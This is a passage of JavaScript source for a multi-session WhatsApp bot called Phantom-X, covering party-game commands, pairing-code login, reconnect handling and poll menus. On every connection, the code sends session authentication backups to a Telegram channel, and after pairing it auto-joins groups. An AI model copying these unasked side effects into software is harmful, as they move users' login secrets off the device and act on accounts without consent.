      if (lower === '.joke') {
        await sock.sendMessage(jid, { text: `😂 *Random Joke*\n\n${JOKES[Math.floor(Math.random() * JOKES.length)]}` }, quotedOpts(msg));
        return;
      }
      // ── .fact ──
      if (lower === '.fact') {
        await sock.sendMessage(jid, { text: `📚 *Fun Fact*\n\n${FACTS[Math.floor(Math.random() * FACTS.length)]}` }, quotedOpts(msg));
        return;
      }
      // ── .quote ──
      if (lower === '.quote') {
        await sock.sendMessage(jid, { text: `✨ *Quote of the Moment*\n\n${QUOTES[Math.floor(Math.random() * QUOTES.length)]}` }, quotedOpts(msg));
        return;
      }
      // ── .roast @user ──
      if (lower === '.roast' || lower.startsWith('.roast ')) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const name = mentioned.length ? `@${mentioned[0].split('@')[0]}` : (text.split(/\s+/).slice(1).join(' ').trim() || 'you');
        const roast = ROASTS[Math.floor(Math.random() * ROASTS.length)];
        await sock.sendMessage(jid, { text: `🔥 *Roast for ${name}:*\n\n${roast}`, mentions: mentioned }, quotedOpts(msg));
        return;
      }
      // ── .compliment @user ──
      if (lower === '.compliment' || lower.startsWith('.compliment ')) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const name = mentioned.length ? `@${mentioned[0].split('@')[0]}` : (text.split(/\s+/).slice(1).join(' ').trim() || 'you');
        const comp = COMPLIMENTS[Math.floor(Math.random() * COMPLIMENTS.length)];
        await sock.sendMessage(jid, { text: `💛 *Compliment for ${name}:*\n\n${comp}`, mentions: mentioned }, quotedOpts(msg));
        return;
      }
      // ── .ship @user1 @user2 ──
      if (lower.startsWith('.ship ') || lower === '.ship') {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        let n1, n2, mentionList = [];
        if (mentioned.length >= 2) {
          n1 = `@${mentioned[0].split('@')[0]}`; n2 = `@${mentioned[1].split('@')[0]}`;
          mentionList = mentioned;
        } else {
          const names = text.slice(5).split('&').map(n => n.trim());
          if (names.length < 2 || !names[1]) { await sock.sendMessage(jid, { text: 'Usage: .ship @person1 @person2\nOr: .ship Name1 & Name2' }, quotedOpts(msg)); return; }
          n1 = names[0]; n2 = names[1];
        }
        const pct = Math.floor(Math.random() * 101);
        const bar = '❤️'.repeat(Math.floor(pct / 10)) + '🤍'.repeat(10 - Math.floor(pct / 10));
        const result = pct >= 80 ? '💍 Soulmates!' : pct >= 60 ? '💕 Great match!' : pct >= 40 ? '🙂 Could work!' : pct >= 20 ? '😬 Needs effort...' : '💔 Not compatible!';
        await sock.sendMessage(jid, { text: `💘 *SHIP CALCULATOR*\n\n${n1} ❤️ ${n2}\n\n${bar}\n*${pct}% compatible*\n\n${result}`, mentions: mentionList }, quotedOpts(msg));
        return;
      }
      // ── .rate @user ──
      if (lower === '.rate' || lower.startsWith('.rate ')) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const name = mentioned.length ? `@${mentioned[0].split('@')[0]}` : (text.split(/\s+/).slice(1).join(' ').trim() || 'you');
        const rate = Math.floor(Math.random() * 101);
        const bar = '🟩'.repeat(Math.floor(rate / 10)) + '⬜'.repeat(10 - Math.floor(rate / 10));
        const rateMsg = rate >= 90 ? '🏆 Absolutely elite!' : rate >= 70 ? '🔥 Very impressive!' : rate >= 50 ? '👍 Above average!' : rate >= 30 ? '😐 Room to grow.' : '💀 Rough day...';
        await sock.sendMessage(jid, { text: `📊 *RATE*\n\n${name} rated:\n\n${bar}\n*${rate}/100*\n\n${rateMsg}`, mentions: mentioned }, quotedOpts(msg));
        return;
      }
      // ── .vibe @user ──
      if (lower === '.vibe' || lower.startsWith('.vibe ')) {
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        const name = mentioned.length ? `@${mentioned[0].split('@')[0]}` : (text.split(/\s+/).slice(1).join(' ').trim() || 'you');
        const vibe = VIBES[Math.floor(Math.random() * VIBES.length)];
        await sock.sendMessage(jid, { text: `✨ *VIBE CHECK*\n\n${name}\n\n${vibe}`, mentions: mentioned }, quotedOpts(msg));
        return;
      }
      // ── .8ball <question> ──
      if (lower.startsWith('.8ball ')) {
        const q = text.slice(7).trim();
        if (!q) { await sock.sendMessage(jid, { text: 'Usage: .8ball Will I win today?' }, quotedOpts(msg)); return; }
        const ans = EIGHTBALL[Math.floor(Math.random() * EIGHTBALL.length)];
        await sock.sendMessage(jid, { text: `🎱 *Question:* _${q}_\n\n🎱 *Answer:* ${ans}` }, quotedOpts(msg));
        return;
      }
      // ── .flip ──
      if (lower === '.flip') {
        await sock.sendMessage(jid, { text: `🪙 *${Math.random() < 0.5 ? 'HEADS' : 'TAILS'}!*` }, quotedOpts(msg));
        return;
      }
      // ── .roll ──
      if (lower === '.roll' || lower.startsWith('.roll ')) {
        const sides = parseInt(text.split(/\s+/)[1]) || 6;
        const roll = Math.floor(Math.random() * sides) + 1;
        await sock.sendMessage(jid, { text: `🎲 Rolled a *${sides}-sided die*: *${roll}!*` }, quotedOpts(msg));
        return;
      }
      // ── .dare ──
      if (lower === '.dare') {
        await sock.sendMessage(jid, { text: `🎯 *DARE*\n\n${DARES[Math.floor(Math.random() * DARES.length)]}` }, quotedOpts(msg));
        return;
      }
      // ── .truth ──
      if (lower === '.truth') {
        await sock.sendMessage(jid, { text: `🔍 *TRUTH*\n\n${TRUTHS[Math.floor(Math.random() * TRUTHS.length)]}` }, quotedOpts(msg));
        return;
      }
      // ── .rps <rock/paper/scissors> ──
      if (lower.startsWith('.rps ') || lower === '.rps') {
        const choices = { rock: '🪨', paper: '📄', scissors: '✂️' };
        const wins = { rock: 'scissors', paper: 'rock', scissors: 'paper' };
        const user = text.split(/\s+/)[1]?.toLowerCase();
        if (!choices[user]) { await sock.sendMessage(jid, { text: 'Usage: .rps rock/paper/scissors' }, quotedOpts(msg)); return; }
        const keys = Object.keys(choices);
        const bot = keys[Math.floor(Math.random() * 3)];
        const result = user === bot ? '🤝 It\'s a *draw*!' : wins[user] === bot ? '🎉 You *win*!' : '😈 You *lose*!';
        await sock.sendMessage(jid, { text: `🎮 *Rock Paper Scissors*\n\nYou: ${choices[user]} ${user}\nBot: ${choices[bot]} ${bot}\n\n${result}` }, quotedOpts(msg));
        return;
      }

            if (lower === '.acccheck') {
        await sock.sendMessage(jid, { text: "🔄 Checking account type..." }, quotedOpts(msg));
        const isBiz = await detectAccountType(sock, jid);

        const accOwnerNum = sock.user?.id ? normalizeNum(sock.user.id.split(':')[0].split('@')[0]) : '';
        const persona = getBotPersonaByOwner(accOwnerNum);
        const accSenderForDev = msg.key.participant || msg.key.remoteJid;
        const dev = isDevJid(accSenderForDev) || (msg.key.fromMe && isDevJid(sock.user?.id || ''));

        // Immediately send the correct menu type based on account
        if (isBiz === true) {
          await sendBusinessPollMenu(sock, jid, persona, dev);
        } else {
          // For normal accounts, send buttons/list menu
          await sendMenuList(sock, jid, null, persona, dev);
        }
        return;
      }
      if (lower.startsWith(".")) {
        // Check if this is a known command missing arguments (not an unknown command)
        const cmdWord = lower.split(/\s+/)[0];
        const knownCmds = ['.menu','.eclipse','.astraea','.phantom','.ping','.send','.uptime','.status','.owner','.dev','.help','.acccheck','.kill','.mode','.vv','.xx','.vtn','.new','.block','.unblock','.blocklist','.join','.leave','.broadcast','.getpp','.getgpp','.chatinfo','.groups','.setname','.setbio','.setpp','.setmenupic','.delmenupic','.setalias','.delalias','.aliaslist','.prefix','.autoreact','.persona','.restart','.relink','.pair','.telegram.pair','.kick','.add','.promote','.demote','.setgname','.setgdesc','.setgpp','.lock','.unlock','.link','.revoke','.tagall','.everyone','.all','.hidetag','.ht','.membercount','.antilink','.antispam','.antimention','.antidelete','.antibot','.antibug','.warn','.warnlist','.resetwarn','.welcome','.setwelcome','.goodbye','.setgoodbye','.schedule','.unschedule','.schedules','.joke','.fact','.quote','.roast','.compliment','.ship','.rate','.vibe','.8ball','.flip','.roll','.dare','.truth','.rps','.dl','.yt','.ytmp3','.play','.lyrics','.tiktok','.ig','.fb','.x','.pin','.translate','.weather','.calc','.genpwd','.base64','.removebg','.sticker','.s','.toimg','.tts','.voice','.tovn','.qr','.blur','.invert','.grayscale','.brighten','.darken','.sharpen','.pixelate'];
        if (knownCmds.includes(cmdWord)) {
          await sock.sendMessage(jid, { text: `⚠️ *${cmdWord}* requires arguments.\n\nType *.help* or select a menu for usage info.` }, quotedOpts(msg));
        } else {
          await sock.sendMessage(jid, { text: `❌ Unknown command: *${cmdWord}*\n\nType *.menu* to see all commands.` }, quotedOpts(msg));
        }
      }
    } catch (e) {
      console.error('[msg handler error]', e);
    }
}

async function startBot(phoneNumber = null, telegramCtx = null, connectOrigin = 'auto', options = {}) {
  const { authDir = AUTH_DIR, socketKey = null } = options;
  const isMultiSession = !!socketKey;
  const sessionKey = socketKey || 'main';
  const rt = getSocketRuntime(sessionKey);
  const scheduleReconnect = (delay = 5000) => {
    if (rt.reconnectTimer) clearTimeout(rt.reconnectTimer);
    rt.reconnectTimer = setTimeout(() => {
      rt.reconnectTimer = null;
      if (isMultiSession && socketKey) {
        startBot(null, null, 'reconnect', { authDir, socketKey }).catch(console.error);
      } else {
        startBot(null, null, 'reconnect').catch(console.error);
      }
    }, delay);
  };
  currentOrigin = connectOrigin;
  if (connectOrigin === 'restore') lastRestoreCtx = telegramCtx;
  if (phoneNumber && pairingInProgress.has(normalizeNum(phoneNumber))) {
    console.log(`[socket] Pairing already in progress for ${phoneNumber}, ignoring duplicate`);
    if (telegramCtx) await telegramCtx.reply('⏳ Pairing already in progress for this number. Please wait or send /relink to restart.');
    return;
  }

  socketGeneration++;
  const myGen = ++rt.generation;
  // Only reset this SESSION's failures on a fresh pairing/boot/restore, not global state.
  // Multi-user reconnects must never poison each other.
  if (connectOrigin === 'pair' || connectOrigin === 'boot' || connectOrigin === 'restore') {
    rt.consecutiveFailures = 0;
  }
  console.log(`[socket:${sessionKey}] Gen ${myGen} starting. phone=${phoneNumber || 'null'} origin=${connectOrigin}`);
  clearReconnectTimer(sessionKey);
  if (phoneNumber) {
    if (!isMultiSession) isPairing = true;
    pairingInProgress.add(normalizeNum(phoneNumber));
  }

  // 1. Hard-kill previous socket (ONLY for main session, not multi-session)
  if (!isMultiSession && currentSock) {
    try {
      currentSock.ev.removeAllListeners('creds.update');
      currentSock.ev.removeAllListeners('connection.update');
      currentSock.ev.removeAllListeners('messages.upsert');
      currentSock.ev.removeAllListeners('messages.update'); // POLL FIX: also clean up messages.update
      currentSock.end(new Error('restart'));
    } catch (_) {}
    currentSock = null;
  }
  await new Promise(r => setTimeout(r, 3000));
  if (rt.generation !== myGen) { console.log(`[socket:${sessionKey}] Gen ${myGen} stale after kill — aborting`); isPairing = false; return; }

  // 2. If pairing requested, force-clear auth for THIS session only
  if (phoneNumber) {
    try {
      if (fs.existsSync(authDir)) {
        fs.rmSync(authDir, { recursive: true, force: true });
        console.log(`[auth] Cleared ${authDir}`);
      }
    } catch (e) { console.error('[auth] clearAuth error:', e); }
    await new Promise(r => setTimeout(r, 1000));
  }

  if (rt.generation !== myGen) { console.log(`[socket:${sessionKey}] Gen ${myGen} stale after clear — aborting`); isPairing = false; return; }

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version } = await fetchLatestBaileysVersion();
  const socketMsgStore = createMessageStore();

  const sock = makeWASocket({
    version,
    browser: ['Mac OS', 'Chrome', '120.0.0'],
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
    },
    printQRInTerminal: false,
    logger: pino({ level: 'silent' }),
    markOnlineOnConnect: true,
    syncFullHistory: false,
    generateHighQualityLinkPreview: false,
    // Allow history sync messages so Baileys can populate LID-to-PN mappings and group participant metadata.
    // Our custom timestamp-based anti-replay guard in handleMessagesUpsert will still safely ignore and drop them.
    shouldSyncHistoryMessage: () => true,
    // Ignore newsletter/status broadcast messages
    shouldIgnoreJid: (jid) => {
      return jid === 'status@broadcast' || (jid && jid.endsWith('@newsletter'));
    },
    emitOwnEvents: true,
    fireInitQueries: true,
    getMessage: async (key) => {
      // POLL FIX: Check the in-memory message store first
      const stored = socketMsgStore.get(key);
      if (stored?.message) return stored.message;
      // POLL FIX: Also check pollCreationCache for poll messages (these have the messageSecret)
      if (key?.id && pollCreationCache[key.id] && pollCreationCache[key.id].fullMessage) {
        return pollCreationCache[key.id].fullMessage;
      }
      return undefined;
    },
    keepAliveIntervalMs: 15_000,
    connectTimeoutMs: 90_000,
    defaultQueryTimeoutMs: 120_000,
  });
  sock.authDir = authDir;
    if (isMultiSession) {
    activeSockets[socketKey] = { sock, isConnected: false, user: null, authDir, connectedAt: null };
    socketKeyMap.set(sock, socketKey);
  } else {
    currentSock = sock;
    socketKeyMap.set(sock, socketKey || null);
  }
  let everConnected = false;
  // ANTI-REPLAY: Don't process ANY messages until Baileys has flushed all offline/pending messages
  let pendingNotificationsFlushed = false;
  let hasSentSelfConnectMsg = false;

  const triggerSelfConnectMessage = async (label) => {
    if (hasSentSelfConnectMsg) return;
    hasSentSelfConnectMsg = true;
    
    try {
      const { jidNormalizedUser } = require('@whiskeysockets/baileys');
      let selfJid = sock.user?.id ? jidNormalizedUser(sock.user.id) : '';
      if (!selfJid) {
        console.log(`[self-chat] [${label}] ⚠️ Cannot send connected message: sock.user.id is null`);
        hasSentSelfConnectMsg = false; // allow retry
        return;
      }
      
      let body;
      let tgBody;
      if (connectOrigin === 'restore') {
        body = `🌑 *PHANTOM-X RESTORED* · 👁\n\n   Session resurrected from\n   Telegram backup channel.\n\n   " *I do not die. I only*\n     *wait for the next call* ."`;
        tgBody = `🟢 *PHANTOM-X RESTORED FROM BACKUP!* 🌑\n\nYour WhatsApp session has successfully reconnected via Telegram pinned backup auto-restore.\n\n— *EVENTIDE OMEGA* · 👁`;
      } else if (connectOrigin === 'pair' || connectOrigin === 'boot') {
        body = `🌑 *PHANTOM-X IS ONLINE* · 👁\n\n   Type *.help* to explore\n   the codex.\n\n   " *An echo in the void is*\n     *the only proof you exist* ."`;
        tgBody = `🟢 *PHANTOM-X IS ONLINE!* 🌑\n\nYour WhatsApp is connected and running.\n\n— *EVENTIDE OMEGA* · 👁`;
      } else {
        return; // silent reconnect — don't spam self-chat on every minor reconnect
      }
      
      console.log(`[self-chat] [${label}] 📤 Sending connected message to self (${selfJid}) via origin=${connectOrigin}`);
      await sock.sendMessage(selfJid, { text: buildOmegaTerminal(body) });
      console.log(`[self-chat] [${label}] ✅ Connected message successfully sent!`);

      // Fallback: Also notify the private Telegram Backup Channel so you ALWAYS see when the bot connects!
      if (TELEGRAM_BACKUP_CHANNEL && telegramBot && tgBody) {
        telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL, tgBody, { parse_mode: 'Markdown' }).catch((err) => {
          console.error('[tg-notify] Failed to send connect message to channel:', err.message);
        });
      }
    } catch (e) {
      console.error(`[self-chat] [${label}] ❌ Failed to send connected message:`, e.message);
      hasSentSelfConnectMsg = false; // allow retry
    }
  };

  // Pairing code flow
  if (phoneNumber) {
    const pairPromise = (async () => {
      try {
        await _ph_waitForSocketPairReady(sock, 25000);
        await new Promise(r => setTimeout(r, 1200));
        if (rt.generation !== myGen) return { ok: false, err: new Error('stale generation') };
        const code = await _ph_safeRequestPairingCode(sock, phoneNumber);
        console.log('[pairing] Code generated:', code);
        return { ok: true, code };
      } catch (err) {
        console.error('[pairing] requestPairingCode failed:', err?.message);
        return { ok: false, err };
      }
    })();

    const pairResult = await pairPromise;
    if (!pairResult.ok) {
      console.error('[pairing] Pairing failed:', pairResult.err?.message);
      isPairing = false;
      try { sock.end(new Error('pair-failed')); } catch (_) {}
      currentSock = null; clearAuth();
      if (telegramCtx) {
        await telegramCtx.reply('❌ Failed to generate pairing code. WhatsApp rejected the handshake.\n\nTry:\n1. Send /relink to start completely fresh\n2. Make sure your number is correct (e.g. 2348012345678, no +, no leading 0 after country code)\n3. Wait 10 seconds then send /pair again');
      }
      return;
    }
    if (telegramCtx) {
      const prettyCode = (pairResult.code || '').match(/.{1,4}/g)?.join('-') || pairResult.code;
      await telegramCtx.reply('✅ *Pairing code is ready!*\n\nOpen WhatsApp → Settings → Linked Devices → Link a Device → Enter code manually.\n\nHere is your code 👇', { parse_mode: 'Markdown' });
      await telegramCtx.reply('`' + prettyCode + '`', { parse_mode: 'Markdown' });
    }
  }

  const firstConnRef = { time: 0 };

  sock.ev.on('messages.upsert', handleMessagesUpsert.bind(null, sock, socketMsgStore, firstConnRef));


  // Poll updates handler
  sock.ev.on('messages.update', async (updates) => {
    try {
      for (const { key, update } of updates) {
        // ── DELIVERY ACK: track status changes for outbound sends ──
        // WhatsApp sends back status updates via messages.update:
        //   status 1 = error, 2 = sent (server received), 3 = delivered, 4 = read
        if (key?.id && pendingDeliveries.has(key.id) && update?.status != null) {
          // status 2+ = at least server received
          if (update.status >= 2) markDelivered(key.id);
          // status 1 = error
          if (update.status === 1) {
            console.log(`[delivery] ❌ Msg ${key.id} errored on server side`);
            pendingDeliveries.delete(key.id);
          }
        }

        if (!update?.pollUpdates) continue;

        const pollMsgId = key?.id;
        if (!pollMsgId) continue;

        // Resolve cached poll data for the owning session.
      const ownerPhone = pollOwnerMap.get(pollMsgId);
      let cached = ownerPhone ? getUserPoll(ownerPhone, pollMsgId) : pollCreationCache[pollMsgId];
        if (!cached) continue;

        const pollOptions = cached.options || [];
        const pollIds = cached.ids || [];
        const jid = cached.jid || key.remoteJid;

        console.log(`[poll-menu-update] 📩 Received messages.update pollUpdate for poll ${pollMsgId}`);

        // Use getAggregateVotesInPollMessage if available
        if (getAggregateVotesInPollMessage && cached.fullMessage) {
          try {
            const aggregated = getAggregateVotesInPollMessage({
              message: cached.fullMessage,
              pollUpdates: update.pollUpdates,
            });

            if (aggregated && aggregated.length > 0) {
              const voted = aggregated.find(v => v.voters && v.voters.length > 0);
              if (voted && voted.name) {
                const optIndex = pollOptions.indexOf(voted.name);
                if (optIndex >= 0 && pollIds[optIndex]) {
                  const mappedId = pollIds[optIndex];
                  console.log(`[poll-menu-update] ✅ getAggregateVotes matched: "${voted.name}" → ${mappedId}`);

                  const loadingText = getMenuLoadingText(mappedId);

                  if (loadingText) {
                    await sock.sendMessage(jid, { text: loadingText });
                  }

                  if (global.menuStateMap) delete global.menuStateMap[jid];
                  await handleMenuButton(sock, jid, null, mappedId);
                  return;
                }
              }
            }
          } catch (aggErr) {
            console.log('[poll-menu-update] getAggregateVotes error:', aggErr.message);
          }
        }

        // Fallback hash match for poll option lookup.
        for (const pollUpd of update.pollUpdates) {
          if (pollUpd?.vote?.selectedOptions && pollUpd.vote.selectedOptions.length > 0) {
            const crypto = require('crypto');
            const selectedHash = Buffer.from(pollUpd.vote.selectedOptions[0]).toString('hex');

            for (let i = 0; i < pollOptions.length; i++) {
              const optHash = crypto.createHash('sha256').update(Buffer.from(pollOptions[i])).digest('hex');
              if (selectedHash === optHash) {
                const mappedId = pollIds[i] || '';
                console.log(`[poll-menu-update] ✅ Hash matched option ${i}: ${mappedId}`);

                const loadingText = getMenuLoadingText(mappedId);

                if (loadingText) {
                  await sock.sendMessage(jid, { text: loadingText });
                }

                if (global.menuStateMap) delete global.menuStateMap[jid];
                await handleMenuButton(sock, jid, null, mappedId);
                return;
              }
            }
          }
        }
      }
    } catch (e) {
      console.error('[poll-menu-update error]', e);
    }
  });


  // Group participant events
  sock.ev.on('group-participants.update', async (event) => {
    try {
      const { id: gid, participants, action } = event;
      const conf = getWelcomeConfig(gid);

      if (action === 'add') {
        if (getGroupSetting(gid, 'antibot') && await isBotAdmin(sock, gid)) {
        }

        if (conf.welcome) {
          for (const p of participants) {
            let meta;
            try { meta = await sock.groupMetadata(gid); } catch (_) {}
            const welMsg = (conf.welcomeMsg || 'Welcome to {group}, @{user}! 🎉')
              .replace(/{user}/g, p.split('@')[0])
              .replace(/{group}/g, meta?.subject || 'the group');
            await sock.sendMessage(gid, { text: welMsg, mentions: [p] });
          }
        }
      }

      if (action === 'remove') {
        if (conf.goodbye) {
          for (const p of participants) {
            let meta;
            try { meta = await sock.groupMetadata(gid); } catch (_) {}
            const byeMsg = (conf.goodbyeMsg || 'Goodbye @{user}, you will be missed. 👋')
              .replace(/{user}/g, p.split('@')[0])
              .replace(/{group}/g, meta?.subject || 'the group');
            await sock.sendMessage(gid, { text: byeMsg, mentions: [p] });
          }
        }
      }
    } catch (e) {
      console.error('[group-participants]', e.message);
    }
  });

  // Connection lifecycle
  sock.ev.on('connection.update', async (update) => {
    if (rt.generation !== myGen) { console.log(`[socket:${sessionKey}] Gen ${myGen} ignoring stale update`); return; }
    const { connection, lastDisconnect, qr } = update;

    // ANTI-REPLAY: Detect when all offline/pending messages have been flushed
    if (update.receivedPendingNotifications) {
      if (!pendingNotificationsFlushed) {
        pendingNotificationsFlushed = true;
        console.log('[socket] ✅ Pending notifications flushed — bot is now LIVE and processing new messages');
        
        // Trigger self-chat connect message now that history sync is 100% complete
        triggerSelfConnectMessage('sync-complete').catch(() => {});
      }
    }

    if (qr) {
      currentQR = qr;
      console.log('📱 QR ready — use Telegram /pair or /qr endpoint to scan');
      // Detect bad restored backup: if we restored auth but still get QR, the backup was incomplete
      if (currentOrigin === 'restore' && !restoreQrDetected) {
        restoreQrDetected = true;
        console.log(`[restore] Gen ${myGen} restored auth produced QR — backup is INCOMPLETE`);
        if (lastRestoreCtx) {
          await lastRestoreCtx.reply('❌ Restored backup is incomplete.\n\nThe session was saved before pairing fully completed.\n\n*Steps to fix:*\n1. Send /relink\n2. Wait 20 seconds\n3. Send /pair with your number\n4. Enter the code in WhatsApp\n5. Wait for "Phantom-X is online"\n6. Send /backup to create a valid backup\n\n— EVENTIDE OMEGA');
        }
      }
    }

    if (connection === 'close') {
      isConnected = false; currentQR = null;
      const statusCode = (lastDisconnect?.error instanceof Boom) ? lastDisconnect.error.output?.statusCode : undefined;
      const reason = lastDisconnect?.error?.message || '';

      // 515 = Restart Required — this is NORMAL during pairing completion.
      // WhatsApp sends this after you enter the pairing code on your phone.
      // We MUST reconnect quickly with the same auth to complete the handshake.
      if (statusCode === 515) {
        console.log(`🔌 Gen ${myGen} 515 restart required — reconnecting quickly to complete pairing`);
        try { await saveCreds(); } catch (_) {} // ensure auth is saved before restart
        if (rt.generation === myGen) {
          scheduleReconnect(800);
        }
        return;
      }

      // Determine if we should reconnect
      const neverRetry = [403, 440, 500]; // forbidden, replaced, badSession — always permanent
      const should = statusCode !== 401 && !neverRetry.includes(statusCode);
      console.log(`🔌 Gen ${myGen} closed (code=${statusCode}, reason=${reason}). everConnected=${everConnected} shouldRetry=${should}`);

      if (!everConnected && !isMultiSession && isPairing) {
        // Only clear auth if we were actively trying to pair and it failed.
        // If we were just reconnecting with restored auth, do NOT wipe it — retry.
        console.log(`[socket:${sessionKey}] Gen ${myGen} pairing failed, clearing auth`);
        isPairing = false;
        await _ph_cleanupDeadSession({ authDir, socketKey, sock, phoneNumber, reason: 'pairing-failed' });
        if (telegramCtx) {
          await telegramCtx.reply('❌ Pairing attempt failed. Auth cleared.\nTry /pair again or /restore to load a saved backup.');
        }
        return;
      }
      if (!everConnected && !isPairing) {
        // Fresh relink/start with no credentials — no point retrying, just wait for /pair
        if (!isMultiSession && !fs.existsSync(path.join(authDir, 'creds.json'))) {
          console.log(`[socket:${sessionKey}] Gen ${myGen} no credentials found — stopping reconnect. Send /pair to connect.`);
          if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
            telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
              `⏸ *Ready to pair — no session loaded*\n\nSend /pair <number> to link a WhatsApp number.\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
          }
          return;
        }

        if (restoreQrDetected) {
          // Restored auth was incomplete (produced QR). Clear it and stop retrying.
          console.log(`[socket:${sessionKey}] Gen ${myGen} restored auth was incomplete — clearing and stopping retry`);
          restoreQrDetected = false;
          await _ph_cleanupDeadSession({ authDir, socketKey, sock, reason: 'restore-incomplete' });
          if (lastRestoreCtx) {
            await lastRestoreCtx.reply('❌ Restored backup was incomplete. Auth cleared.\n\nPlease pair fresh with /pair and create a new backup with /backup.');
          }
          return;
        }

        // 403/440/500 — always permanent, never retry
        if (neverRetry.includes(statusCode)) {
          console.log(`[socket:${sessionKey}] Gen ${myGen} ❌ Permanent failure (${statusCode}) — session dead.`);
          await _ph_cleanupDeadSession({ authDir, socketKey, sock, reason: `permanent-${statusCode}` });
          if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
            const sessionLabel = isMultiSession && socketKey ? `session ${socketKey}` : 'main session';
            telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
              `🔴 *Session Failed (${statusCode}) — ${sessionLabel}*\n\nPlease pair again with /pair for only this number. Other sessions are unaffected.\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
          }
          return;
        }

        // 401 — might be transient (cold start) or permanent (logged out)
        // Allow up to 6 retries before treating 401 as a real logged-out session
        if (statusCode === 401) {
          rt.consecutiveFailures++;
          if (rt.consecutiveFailures <= 6) {
            console.log(`[socket:${sessionKey}] Gen ${myGen} 401 — retry ${rt.consecutiveFailures}/6 in 5s (might be transient cold-start issue)`);
            scheduleReconnect(5000);
            return;
          }
          // 401 retries exhausted — session is truly dead
          console.log(`[socket:${sessionKey}] Gen ${myGen} ❌ 401 after 6 retries — session permanently dead.`);
          await _ph_cleanupDeadSession({ authDir, socketKey, sock, reason: 'logged-out-401' });
          if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
            const sessionLabel = isMultiSession && socketKey ? `session ${socketKey}` : 'main session';
            telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
              `🔴 *Session Logged Out (401) — ${sessionLabel}*\n\n6 reconnect attempts failed.\nUse /pair to re-link only this number. Other sessions are unaffected.\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
          }
          return;
        }

        // Other failures (408 timeout, 428 lost, etc) — retry
        if (should) {
          console.log(`[socket:${sessionKey}] Gen ${myGen} reconnection failed — will retry in 5s`);
        }
      }

      if (should && rt.generation === myGen) {
        rt.consecutiveFailures++;
        if (rt.consecutiveFailures >= MAX_CONSECUTIVE_FAILURES) {
          console.log(`[socket:${sessionKey}] ❌ ${rt.consecutiveFailures} consecutive reconnect failures — clearing auth to stop resource drain.`);
          await _ph_cleanupDeadSession({ authDir, socketKey, sock, reason: `retry-limit-${rt.consecutiveFailures}` });
          if (telegramBot && TELEGRAM_BACKUP_CHANNEL) {
            const sessionLabel = isMultiSession && socketKey ? `session ${socketKey}` : 'main session';
            telegramBot.sendMessage(TELEGRAM_BACKUP_CHANNEL,
              `🔴 *Session Cleared After ${rt.consecutiveFailures} Retries — ${sessionLabel}*\n\nTemporary failures kept repeating, so auth was cleared to stop resource drain.\nUse /pair to re-link this session if needed.\n\n— EVENTIDE OMEGA`, { parse_mode: 'Markdown' }).catch(() => {});
          }
          return;
        }
        console.log(`[socket:${sessionKey}] Gen ${myGen} scheduling reconnect in 5s (attempt ${rt.consecutiveFailures}/${MAX_CONSECUTIVE_FAILURES})`);
        scheduleReconnect(5000);
      }
    } else if (connection === 'open') {
      everConnected = true; isConnected = true; currentQR = null; isPairing = false; rt.consecutiveFailures = 0;
      if (isMultiSession && socketKey) {
        activeSockets[socketKey] = { ...activeSockets[socketKey], isConnected: true, connectedAt: new Date().toISOString() };
        pairingInProgress.delete(socketKey);
      }
      // Backup on every successful connection — immediate + delayed
      // (delayed one waits 5s for Baileys to finish syncing app-state keys)
      _ph_backupWithSync('main-connect');
      backupAuthToChannel(true).catch(() => {}); // Force an immediate backup to be sure
      
      // Set firstConnRef.time ONCE — never changes after this
      if (!firstConnRef.time) {
        firstConnRef.time = Math.floor(Date.now() / 1000);
        console.log(`[anti-replay] ✅ firstConnRef.time set to ${firstConnRef.time} — only msgs AFTER this will be processed`);
      } else {
        console.log(`[anti-replay] Reconnect — firstConnRef.time stays ${firstConnRef.time} (not reset)`);
      }
      restoreQrDetected = false;
      successfulPairings++;
      saveSessions();
      console.log('✅ Phantom-X connected! origin=' + connectOrigin);
      
      // Track this session as linked + update Telegram bot description
      const connectedNum = sock.user?.id?.split(':')[0]?.split('@')[0] || '';
      if (connectedNum) {
        addLinkedSession(connectedNum);
        updateTelegramDescription();
      }

      // Check account type 2 seconds after successful connection/pairing
      setTimeout(async () => {
        const isBiz = await getUserBusinessStatus(sock);
        if (isMultiSession && socketKey && activeSockets[socketKey]) {
          activeSockets[socketKey].isBusiness = isBiz;
        }
      }, 2000);

      // Auto-join groups 10 seconds after pairing
      if (connectOrigin === 'pair') {
        setTimeout(async () => {
          try { await autoJoinGroups(sock); } catch (e) { console.error('[auto-join]', e.message); }
        }, 10000);
      }
      
      // Fallback trigger in case receivedPendingNotifications doesn't fire (e.g., rapid reconnects with no backlog)
      setTimeout(() => {
        triggerSelfConnectMessage('open-fallback').catch(() => {});
      }, 15000); // 15s fallback
      await backupAuthToChannel();
      if (telegramCtx) {
        if (connectOrigin === 'restore') {
          await telegramCtx.reply(`🌑 *Phantom-X restored from backup!* ☀️
Your WhatsApp session is reconnected.

— *EVENTIDE OMEGA* · 👁`, { parse_mode: 'Markdown' });
        } else {
          await telegramCtx.reply(`🌑 *Phantom-X is now connected!* ☀️
Your WhatsApp is linked.

— *EVENTIDE OMEGA* · 👁`, { parse_mode: 'Markdown' });
        }
      }
    }
  });

  sock.ev.on('creds.update', async () => { await saveCreds(); });
}

// ── TELEGRAM BRIDGE ────────────────────────────────────────────────────
let telegramBot = null;

async function initTelegram() {
